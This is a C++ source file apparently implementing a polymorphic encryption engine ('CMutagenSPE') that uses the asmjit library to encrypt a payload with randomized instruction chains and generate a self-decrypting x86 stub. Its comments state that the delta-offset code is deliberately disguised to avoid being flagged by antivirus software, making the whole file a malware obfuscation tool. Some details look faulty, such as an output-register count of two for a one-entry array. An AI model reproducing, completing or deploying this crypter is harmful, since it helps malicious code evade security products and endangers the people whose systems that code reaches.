#include "includes.hpp"
#include "bagheera.hpp"

using namespace asmjit;

// types problem: https://stackoverflow.com/questions/16297073/win32-data-types-equivalant-in-linux
// https://github.com/niosus/EasyClangComplete

///////////////////////////////////////////////////////////
//
// random register selection
//
///////////////////////////////////////////////////////////

void CMutagenSPE::RandomizeRegisters()
{
  using namespace asmjit::x86;
  std::cout << "PE: Randomizing registers\n";
  // set random registers
  //Gp cRegsGeneral[] = { regs::eax, regs::ecx, regs::ebx, regs::edx, regs::esi, regs::edi };
  Gp cRegsGeneral[] =  {regs::eax, regs::ecx, regs::ebx, regs::edx, regs::esi, regs::edi};

  // obtain a time-based seed:
  //unsigned seed = std::chrono::system_clock::now().time_since_epoch().count();

  // shuffle the order of registers in the array
  //mixup_array(cRegsGeneral, _countof(cRegsGeneral));
  //shuffle (cRegsGeneral.begin(), cRegsGeneral.end(), std::default_random_engine(seed));
  std::random_shuffle(&cRegsGeneral[0], &cRegsGeneral[6]);

  // the register which will contain
  // a pointer to the encrypted data
  regSrc = cRegsGeneral[0];

  // the register which will contain
  // a pointer to the output buffer
  // (supplied as a function parameter)
  regDst = cRegsGeneral[1];

  // the register which will contain
  // the size of the encrypted data buffer
  regSize = cRegsGeneral[2];

  // the register which will contain
  // the decryption key
  regKey = cRegsGeneral[3];

  // the register which will contain
  // the current data value and on which
  // the decryption instructions will operate
  regData = cRegsGeneral[4];

  // set the register whose values will be
  // preserved across function invocations
  // Gp cRegsSafe[] = { regs::esi, regs::edi, regs::ebx };
  Gp cRegsSafe[] = {regs::eax, regs::ecx, regs::ebx, regs::edx, regs::esi, regs::edi};
  
  // obtain a time-based seed:
  //seed = std::chrono::system_clock::now().time_since_epoch().count();

  // shuffle the order of the registers in the array
  // mixup_array(cRegsSafe, _countof(cRegsSafe));
  //shuffle (cRegsSafe.begin(), cRegsSafe.end(), std::default_random_engine(seed));
  std::random_shuffle(&cRegsSafe[0], &cRegsSafe[6]);

  regSafe1 = cRegsSafe[0];
  regSafe2 = cRegsSafe[1];
  regSafe3 = cRegsSafe[2];
}


///////////////////////////////////////////////////////////
//
// generate the prologue of the decryption function
//
///////////////////////////////////////////////////////////

void CMutagenSPE::GeneratePrologue(x86::Assembler& a)
{
  using namespace asmjit::x86;

  std::cout << "PE: Generating prologue\n";
  // function prologue
  // first the original value of EBP is saved
  // so we can use EBP to refer to the stack frame
  if (rand()%2 == 0)
  {
    a.push(ebp);
    a.mov(ebp, esp);    
  }
  else
  {
    // equivalent to the instructions
    // push ebp
    // mov ebp,esp
    a.enter(imm(0), imm(0));
  }

  // if our function is called using the stdcall
  // convention, and modifies ESI, EDI, or EBX,
  // they must be saved at the beginning of
  // the function and restored at the end
  a.push(regSafe1);
  a.push(regSafe2);
  a.push(regSafe3);

  // load the pointer to the output buffer
  // into our randomly-selected register regDst
  // (this is the only parameter to the function,
  // passed on the stack)
  a.mov(regDst, dword_ptr(regs::ebp, 0x08 + (4 * 0)));
}


///////////////////////////////////////////////////////////
//
// generate delta offset
//
///////////////////////////////////////////////////////////

void CMutagenSPE::GenerateDeltaOffset(x86::Assembler& a)
{
  using namespace asmjit::x86;

  std::cout << "PE: Calculating delta offset\n";
  // generate code which will allow us to
  // obtain a pointer to the encrypted data
  // at the end of the decryption function

  // decryption_function:
  // ...
  // call delta_offset
  // mov eax,1 | xor eax,eax ; |
  // leave                   ;  > unused instructions
  // ret 4                   ; |
  // delta_offset:
  // pop regSrc
  // add regSrc, (encrypted_data-delta_offset +
  // ...          + size of the unused instructions)
  // ret 4
  // db 0CCh, 0CCh...
  // encrypted_data:
  // db 0ABh, 0BBh, 083h...

  // create the delta_offset label
  lblDeltaOffset = a.newLabel();

  // generate 'call delta_offset'
  a.call(lblDeltaOffset);

  size_t posUnusedCodeStart = a.offset();

  // in order to avoid getting flagged by
  // antivirus software, we avoid the typical
  // delta offset construction, i.e. call + pop,
  // by inserting some unused instructions in
  // between, in our case a sequence that looks
  // like the normal code which returns from
  // a function
  if (rand()%2 == 0)
  {
    a.mov(regs::eax, imm(1));
  }
  else
  {
    a.xor_(regs::eax, regs::eax);
  }

  a.leave();
  a.ret(1 * sizeof(unsigned long));

  // calculate the size of the unused code,
  // i.e. the difference between the current
  // position and the beginning of the
  // unused code
  dwUnusedCodeSize = static_cast<unsigned long>(a.offset() - posUnusedCodeStart);

  // put the label "delta_offset:" here
  a.bind(lblDeltaOffset);

  posDeltaOffset = a.offset();

  // instead of the pop instruction, we will
  // use a different method of reading the
  // stack, to avoid rousing the suspicions of
  // antivirus programs

  //a.pop(regSrc);
  a.mov(regSrc, dword_ptr(regs::esp));
  a.add(regs::esp, imm(sizeof(unsigned long)));

  // the address of the label "delta_offset:"
  // will now be in the regSrc register;
  // we need to adjust this by the size of
  // the remainder of the function (which we
  // don't know and will have to update later)
  // for now we use the value 987654321 to
  // ensure asmjit generates the long form of
  // the "add" instruction
  a.long_().add(regSrc, imm(987654321));

  // save the position of the previous unsigned long
  // so that we can later update it to contain
  // the length of the remainder of the function
  posSrcPtr = a.offset() - sizeof(unsigned long);
}

///////////////////////////////////////////////////////////
//
// generate the encryption keys, encryption instructions,
// and finally encrypt the input data
//
///////////////////////////////////////////////////////////

void CMutagenSPE::EncryptInputBuffer(unsigned char * lpInputBuffer, \
                                     unsigned long dwInputBuffer, \
                                     unsigned long dwMinInstr, \
                                     unsigned long dwMaxInstr)
{

  using namespace asmjit::x86;

  std::cout << "PE: Encrypting input buffer\n";
  // generate an encryption key
  dwEncryptionKey = (unsigned long) rand();

  // round up the size of the input buffer
  unsigned long dwAlignedSize __attribute__ ((aligned)) = dwInputBuffer;
  

  // number of blocks to encrypt
  // divide the size of the input data
  // into blocks of 4 bytes (DWORDs)
  dwEncryptedBlocks = dwAlignedSize / sizeof(unsigned long);

  unsigned long * lpdwInputBuffer = reinterpret_cast<unsigned long *>(lpInputBuffer);

  // allocate memory for the output data
  // (the size will be rounded to the
  // block size)
  posix_memalign((void **)&diEncryptedData, BLOCK_SIZE, dwAlignedSize);

  unsigned long * lpdwOutputBuffer = reinterpret_cast<unsigned long *>(diEncryptedData);

  // randomly select the number of encryption instructions
  dwCryptOpsCount = dwMinInstr + rand() % (( dwMaxInstr + 1 ) - dwMinInstr);

  // allocate memory for an array which will
  // record information about the sequence of
  // encryption instructions
  posix_memalign((void **)&diCryptOps, BLOCK_SIZE, dwCryptOpsCount * sizeof(SPE_CRYPT_OP));


  // set up a direct pointer to this table
  // in a helper variable
  lpcoCryptOps = reinterpret_cast<P_SPE_CRYPT_OP>(diCryptOps);

  // generate encryption instructions and their type
  for (unsigned long i = 0; i < dwCryptOpsCount; i++)
  {
    // will the instruction perform an operation
    // combining regData and regKey?
    lpcoCryptOps[i].bCryptWithReg = rand()%2;

    // the register we are operating on
    lpcoCryptOps[i].regDst = regData;

    // if the instruction doesn't use the regKey
    // register, generate a random key which
    // will be used in the operation
    if (lpcoCryptOps[i].bCryptWithReg == FALSE)
    {
      lpcoCryptOps[i].dwCryptValue = (unsigned long) rand();
    }
    else
    {
      lpcoCryptOps[i].regSrc = regKey;
    }

    // randomly choose the type of encryption instruction
    lpcoCryptOps[i].cCryptOp = static_cast<unsigned char>(dwMinInstr + rand() % (( dwMaxInstr + 1 ) - dwMinInstr));
  }

  // encrypt the input data according to the
  // instructions we have just generated
  for (unsigned long i = 0, dwInitialEncryptionKey = dwEncryptionKey; i < dwEncryptedBlocks; i++)
  {
    // take the next block for encryption
    unsigned long dwInputBlock = lpdwInputBuffer[i];

    // encryption loop: executes the sequence of
    // encryption instructions on the data block
    for (unsigned long j = 0, dwCurrentEncryptionKey; j < dwCryptOpsCount; j++)
    {
      if (lpcoCryptOps[j].bCryptWithReg == FALSE)
      {
        dwCurrentEncryptionKey = lpcoCryptOps[j].dwCryptValue;
      }
      else
      {
        dwCurrentEncryptionKey = dwInitialEncryptionKey;
      }

      // depending on the encryption operation,
      // perform the appropriate modification
      // of the data block
      switch(lpcoCryptOps[j].cCryptOp)
      {
      case SPE_CRYPT_OP_ADD:
        dwInputBlock += dwCurrentEncryptionKey;
        break;
      case SPE_CRYPT_OP_SUB:
        dwInputBlock -= dwCurrentEncryptionKey;
        break;
      case SPE_CRYPT_OP_XOR:
        dwInputBlock ^= dwCurrentEncryptionKey;
        break;
      case SPE_CRYPT_OP_NOT:
        dwInputBlock = ~dwInputBlock;
        break;
      case SPE_CRYPT_OP_NEG:
        dwInputBlock = 0L - dwInputBlock;
        break;
      }
    }

    // store the encrypted block in the buffer
    lpdwOutputBuffer[i] = dwInputBlock;
  }
}


///////////////////////////////////////////////////////////
//
// set up the keys which will be used to decrypt the data
//
///////////////////////////////////////////////////////////

void CMutagenSPE::SetupDecryptionKeys(x86::Assembler& a)
{
  using namespace asmjit::x86;

  std::cout << "PE: Setting up decryption keys\n";
  // set up a decryption key in the regKey
  // register, which will itself be encrypted
  unsigned long dwKeyModifier = (unsigned long) rand();

  // randomly generate instructions to set up
  // the decryption key
  switch(rand()%3)
  {
  // mov regKey,dwKey - dwMod
  // add regKey,dwMod
  case 0:
    a.mov(regKey, imm(dwEncryptionKey - dwKeyModifier));
    a.add(regKey, imm(dwKeyModifier));
    break;

  // mov regKey,dwKey + dwMod
  // sub regKey,dwMod
  case 1:
    a.mov(regKey, imm(dwEncryptionKey + dwKeyModifier));
    a.sub(regKey, imm(dwKeyModifier));
    break;

  // mov regKey,dwKey ^ dwMod
  // xor regKey,dwMod
  case 2:
    a.mov(regKey, imm(dwEncryptionKey ^ dwKeyModifier));
    a.xor_(regKey, imm(dwKeyModifier));
    break;
  }
}


///////////////////////////////////////////////////////////
//
// generate the decryption code (for the main decryption loop)
//
///////////////////////////////////////////////////////////

void CMutagenSPE::GenerateDecryption(x86::Assembler& a)
{

  using namespace asmjit::x86;

  std::cout << "PE: generating decryption\n";
  // set up the size of the encrypted data
  // (in blocks)
  a.mov(regSize, imm(dwEncryptedBlocks));

  // create a label for the start of the
  // decryption loop
  Label lblDecryptionLoop = a.newLabel();

  a.bind(lblDecryptionLoop);

  // read the data referred to by the
  // regSrc register
  a.mov(regData, dword_ptr(regSrc));

  // build the decryption code by generating each
  // decryption instruction in turn (reversing the
  // order and the operations that were used for
  // encryption!)
  for (int i = dwCryptOpsCount - 1; i != -1; i--)
  {
    // encryption was done either with the key
    // in register regKey, or a constant value,
    // so depending on this we need to generate
    // the appropriate decryption instructions
    if (lpcoCryptOps[i].bCryptWithReg == FALSE)
    {
      unsigned long dwDecryptionKey = lpcoCryptOps[i].dwCryptValue;

      switch(lpcoCryptOps[i].cCryptOp)
      {
      case SPE_CRYPT_OP_ADD:
        a.sub(lpcoCryptOps[i].regDst, imm(dwDecryptionKey));
        break;
      case SPE_CRYPT_OP_SUB:
        a.add(lpcoCryptOps[i].regDst, imm(dwDecryptionKey));
        break;
      case SPE_CRYPT_OP_XOR:
        a.xor_(lpcoCryptOps[i].regDst, imm(dwDecryptionKey));
        break;
      case SPE_CRYPT_OP_NOT:
        a.not_(lpcoCryptOps[i].regDst);
        break;
      case SPE_CRYPT_OP_NEG:
        a.neg(lpcoCryptOps[i].regDst);
        break;
      }
    }
    else
    {
      switch(lpcoCryptOps[i].cCryptOp)
      {
      case SPE_CRYPT_OP_ADD:
        a.sub(lpcoCryptOps[i].regDst, lpcoCryptOps[i].regSrc);
        break;
      case SPE_CRYPT_OP_SUB:
        a.add(lpcoCryptOps[i].regDst, lpcoCryptOps[i].regSrc);
        break;
      case SPE_CRYPT_OP_XOR:
        a.xor_(lpcoCryptOps[i].regDst, lpcoCryptOps[i].regSrc);
        break;
      case SPE_CRYPT_OP_NOT:
        a.not_(lpcoCryptOps[i].regDst);
        break;
      case SPE_CRYPT_OP_NEG:
        a.neg(lpcoCryptOps[i].regDst);
        break;
      }
    }
  }

  // write the decrypted block to the output
  // buffer
  a.mov(dword_ptr(regDst), regData);

  // update the pointers to the input and ouput
  // buffers to point to the next block
  a.add(regSrc, imm(sizeof(unsigned long)));
  a.add(regDst, imm(sizeof(unsigned long)));

  // decrement the loop counter (the number of
  // blocks remaining to decrypt)
  a.dec(regSize);

  // check if the loop is finished
  // if not, jump to the start
  a.jne(lblDecryptionLoop);
}


///////////////////////////////////////////////////////////
//
// set up output registers, including the function return value
//
///////////////////////////////////////////////////////////

void CMutagenSPE::SetupOutputRegisters(SPE_OUTPUT_REGS *regOutput, unsigned long dwCount, x86::Assembler& a)
{

  using namespace asmjit::x86;

  std::cout << "PE: seting up output registers\n";
  // if there are no output registers to
  // set up, return
  if ((regOutput == NULL) || (dwCount == 0))
  {
    return;
  }

  // shuffle the order in which the registers
  // will be set up
  std::random_shuffle(&regOutput[0], &regOutput[dwCount]);

  // generate instructions to set up the
  // output registers
  // mov r32, imm32
  for (unsigned long i = 0; i < dwCount; i++)
  {
    a.mov(regOutput[i].regDst, imm(regOutput[i].dwValue));
  }
}


///////////////////////////////////////////////////////////
//
// generate epilogue of the decryption function
//
///////////////////////////////////////////////////////////

void CMutagenSPE::GenerateEpilogue(unsigned long dwParamCount, x86::Assembler& a)
{

  using namespace asmjit::x86;

  std::cout << "PE: generating epilogue\n";
  // restore the original values of
  // registers ESI EDI EBX
  a.pop(regSafe3);
  a.pop(regSafe2);
  a.pop(regSafe1);

  // restore the value of EBP
  if (rand()%2 == 0)
  {
    a.leave();
  }
  else
  {
    // equivalent to "leave"
    a.mov(regs::esp,regs::ebp);
    a.pop(regs::ebp);
  }

  // return to the code which called
  // our function; additionally adjust
  // the stack by the size of the passed
  // parameters (by stdcall convention)
  a.ret(imm(dwParamCount * sizeof(unsigned long)));
}


///////////////////////////////////////////////////////////
//
// align the size of the decryption function
// to the specified granularity
//
///////////////////////////////////////////////////////////

void CMutagenSPE::AlignDecryptorBody(unsigned long dwAlignment, x86::Assembler& a, CodeHolder& code)
{

  using namespace asmjit::x86;

  std::cout << "PE: aligning decryptor body\n";

  a.align(kAlignCode, dwAlignment);

/*
  // take the current size of the code
  // Might have to add a Codehold variable to the program and use that variable to get code size
  unsigned long dwCurrentSize = code.codeSize();

  // find the number of bytes that would
  // align the size to a multiple of the
  // supplied size (e.g. 4)
  //unsigned long dwAlignmentSize = align_bytes(dwCurrentSize, dwAlignment) - dwCurrentSize;
  unsigned long dwAlignmentSize = AlignNode::alignment();

  // check if any alignment is required
  if (dwAlignmentSize == 0)
  {
    return;
  }

  // add padding instructions (int3 or nop)
  if (rand()%2 == 0)
  {
    while (dwAlignmentSize--) a.int3();
  }
  else
  {
    while (dwAlignmentSize--) a.nop();
  }
  */
}


///////////////////////////////////////////////////////////
//
// correct all instructions making use of
// addressing relative to the delta offset
//
///////////////////////////////////////////////////////////

void CMutagenSPE::UpdateDeltaOffsetAddressing(x86::Assembler& a)
{
  using namespace asmjit::x86;

  std::cout << "PE: update delta offset adress\n";
  /*
    reference: https://asmjit.com/doc/classasmjit_1_1x86_1_1Assembler.html
    section: Using x86::Assembler as Code-Patcher
  */

  // correct the instruction which sets up
  // a pointer to the encrypted data block
  // at the end of the decryption function
  //
  // this pointer is loaded into the regSrc
  // register, and must be updated by the
  // size of the remainder of the function
  // after the delta_offset label
  // a.setDWordAt(posSrcPtr, dwAdjustSize + dwUnusedCodeSize);
  
  size_t current_position = a.offset(); // Get current position
  
  unsigned long dwAdjustSize = static_cast<unsigned long>(current_position - posDeltaOffset); // Calculate the offset to the encrypted data
  
  a.setOffset(posSrcPtr); // Go to place where reference to encrypted data is made
  a.long_().add(regSrc, dwAdjustSize + dwUnusedCodeSize); // Update the instruction with proper direction
  
  a.setOffset(current_position); // Return to position we where in previous to the patch
}


///////////////////////////////////////////////////////////
//
// append the encrypted data to the end of the code
// of the decryption function
//
///////////////////////////////////////////////////////////

void CMutagenSPE::AppendEncryptedData(x86::Assembler& a)
{
  using namespace asmjit::x86;
  std::cout << "PE: append encrypted data\n";

  unsigned long * lpdwEncryptedData = reinterpret_cast<unsigned long *>(diEncryptedData);

  // place the encrypted data buffer
  // at the end of the decryption function
  // (in 4-unsigned char blocks)
  for (unsigned long i = 0; i < dwEncryptedBlocks; i++)
  {
    // May need to change to _emit()
    a.emit(lpdwEncryptedData[i]);

  }
}


///////////////////////////////////////////////////////////
//
// main function - encrypts data and generates polymorphic
//                 decryptor code
//
///////////////////////////////////////////////////////////

int CMutagenSPE::PolySPE(unsigned char * lpInputBuffer, \
                                       unsigned long dwInputBuffer, \
                                       unsigned char * *lpOutputBuffer, \
                                       unsigned long * lpdwOutputSize)
{

  std::cout << "PE: calling main function\n";
  using namespace asmjit::x86;
  ///////////////////////////////////////////////////////////
  //
  // check input parameters
  //
  ///////////////////////////////////////////////////////////

  if ( (lpInputBuffer == NULL) || (dwInputBuffer == 0) || \
       (lpOutputBuffer == NULL) || (lpdwOutputSize == NULL) )
  {
    return MUTAGEN_ERR_PARAMS;
  }

  JitRuntime rt;                    // Create a runtime specialized for JIT.
  CodeHolder code;                  // Create a CodeHolder.
 
  code.init(rt.environment());      // Initialize code to match the JIT environment.
  Assembler a(&code);          // Create and attach x86::Assembler to code.
  code.setLogger(&logger);     // Attach the `logger` to `code` holder.
  //logger.setFile(stdout);


/*
  //std::ofstream logfile { "log.asmjit" };
  code.init(rt.environment());
  //Assembler assembler(&code);
  a.onAttach(&code);
*/
  
  // randomly select registers
  RandomizeRegisters();

  ///////////////////////////////////////////////////////////
  //
  // generate polymorphic function code
  //
  ///////////////////////////////////////////////////////////

  // generate function prologue
  GeneratePrologue(a);

  // set up relative addressing through the delta offset technique
  GenerateDeltaOffset(a);

  // encrypt the input data, generate encryption keys. the additional parameters set the lower and upper limits on the 
  // number of encryption instructions which will be generated (there is no limit to this number, you can specify 
  // numbers in the thousands, but be aware that this will make the output code quite large)
  EncryptInputBuffer(lpInputBuffer, dwInputBuffer, 3, 5);

  // generate code to set up keys for decryption
  SetupDecryptionKeys(a);

  // generate decryption code
  GenerateDecryption(a);

  // set up the values of the output registers
  SPE_OUTPUT_REGS regOutput[] = { { regs::eax, dwInputBuffer } };
  SetupOutputRegisters(regOutput, 2, a);

  // generate function epilogue
  GenerateEpilogue(1L, a);

  // align the size of the function to a multiple
  // of 4 or 16
  AlignDecryptorBody(rand()%2 == 0 ? 4L : 16L, a, code);

  // fix up any instructions that use delta offset addressing
  UpdateDeltaOffsetAddressing(a);

  // place the encrypted data at the end of the function
  AppendEncryptedData(a);

  ///////////////////////////////////////////////////////////
  //
  // free resources
  //
  ///////////////////////////////////////////////////////////

  // free the encrypted data buffer
  //free(&diEncryptedData);

  // free the array of encryption pseudoinstructions
  //free(&diCryptOps);

  ///////////////////////////////////////////////////////////
  //
  // copy the polymorphic code to the output buffer
  //
  ///////////////////////////////////////////////////////////

  unsigned long dwOutputSize = code.codeSize();

  // assemble the code of the polymorphic function (this resolves jumps and labels)
  void *lpPolymorphicCode;
  Error err = rt.add(&lpPolymorphicCode, &code);
  if (err) return 1;                // Handle a possible error returned by AsmJit.

  // this struct describes the allocated memory block
  char *diOutput;

  // allocate memory (with execute permissions) for the output buffer
  posix_memalign((void **)&diOutput, BLOCK_SIZE, dwOutputSize);

  // check that allocation was successful
  if (diOutput != NULL)
  {
    // copy the generated code of the decryption function
    memcpy(diOutput, lpPolymorphicCode, dwOutputSize);

    // provide the output buffer and code size to
    // this function's caller
    *lpOutputBuffer = (unsigned char *)diOutput;
    *lpdwOutputSize = dwOutputSize;

    rt.release(lpPolymorphicCode);
  }
  else
  {
    rt.release(lpPolymorphicCode);

    return MUTAGEN_ERR_MEMORY;
  }

  ///////////////////////////////////////////////////////////
  //
  // function exit
  //
  ///////////////////////////////////////////////////////////

  return MUTAGEN_ERR_SUCCESS;
}

